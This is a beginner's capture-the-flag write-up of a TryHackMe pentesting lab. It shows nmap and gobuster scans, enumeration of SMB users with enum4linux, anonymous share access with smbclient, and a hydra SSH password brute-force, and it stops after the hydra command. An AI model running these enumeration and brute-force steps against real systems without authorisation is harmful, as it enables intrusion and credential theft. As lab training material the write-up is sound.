# Basic Pentesting CTF writeup
this is a beginner level CTF on tryhackme that i decided to upload because why not :)

As part of this ctf challenge there are questions to be answered, but im going to skip this part and just perform the exploitation bit 

#pentesting #tryhackme

## 1. Port Scanning 

As always we start of the Enumeration with a nmap scan of the target 

```shell
$ nmap -sC -sV <target-IP> 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-03 14:49 EDT
Nmap scan report for 10.10.43.247

I always keep my scans basic with a service check and the versions that they're running on. From what i can see, 6 ports are open including SSH, http and SMB.

## 2. Enumeration 

First i check the http through the web browser, nothing spectacular just a default website but the message said 'the website is under maintenance' ???? could mean something?,
i also inspected the source code to see any hidden information but nothing.

![1 port 80](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/656f4a4b-9aff-4e8c-9d7b-d3e97c0eca69)


So at this point i performed a dirbuster search using Gobuster tool. 

```shell
$ gobuster dir -u http://10.10.43.247 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

```
From the search, its appears a directory called 'development'. looks interesting lets take a look.

Ok there are 2 txt directories so lets take a peek. 

dev.txt

![3 message](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/69d31b26-0889-402f-a9f0-b8f1cc0c6eb9)

j.txt 

![image](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/231ea7df-ad73-4a8a-9db4-35660d868012)

Ok so based on these text files i'm able to grab some info. Turns out the usernames of the smb servers starts with a "j" or "k"; this will be good in the furture. Apprently 'K' has configured the SMB server and based on the nmap scan earlier, this appears to be true. 

Now im going to further enumerate the smb server. 

im going to use a tool called Enum4linux to see if i can get any more info on ther smb server or any other potential info that is useful 

```shell
$ enum4linux 10.10.43.247
```
Right, its turns out there are 2 usernames assigned to this server, "jan" and "kay". those must be our previous answers. 

```shell
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                              
S-1-22-1-1000 Unix User\kay (Local User)                                                                            
S-1-22-1-1001 Unix User\jan (Local User)
```
Also the smb server has enable anonymous login access and $IPC hidden shares. the $IPC share enables inter process communication for anonymous users to login without a username or password.

That mean i can leverage this to my advantage by using smbclient command to access the anonymous login. lets do that.

```shell
$ smbclient //10.10.43.247/anonymous 
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 13:31:20 2018
  ..                                  D        0  Thu Apr 19 13:13:06 2018
  staff.txt                           N      173  Thu Apr 19 13:29:55 2018

                14318640 blocks of size 1024. 11090980 blocks available
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
smb: \>
```

Ok i have access to the anonymous login and it appears that there's staff text file inside. im now going to salvage that and view its content. 

```shell
$ cat staff.txt    
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```

Ok so nothing too special about the message, i think this just confirms the 2 usernames, like what i did previously using enum4linux. 

Now that we have 2 usernames; from my nmap scan there is an open ssh, i am now going to perform a brute-force attack using hydra to grab the password for that ssh login.

## 3. Hydra brute-forcing  

Just specify the username and apply a password wordlist, im using rockyou.txt, and specify the IP and the type of attack (attack the ssh login)

```shell
$ hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.43.247 ssh

Now im going to login the ssh with this credential.
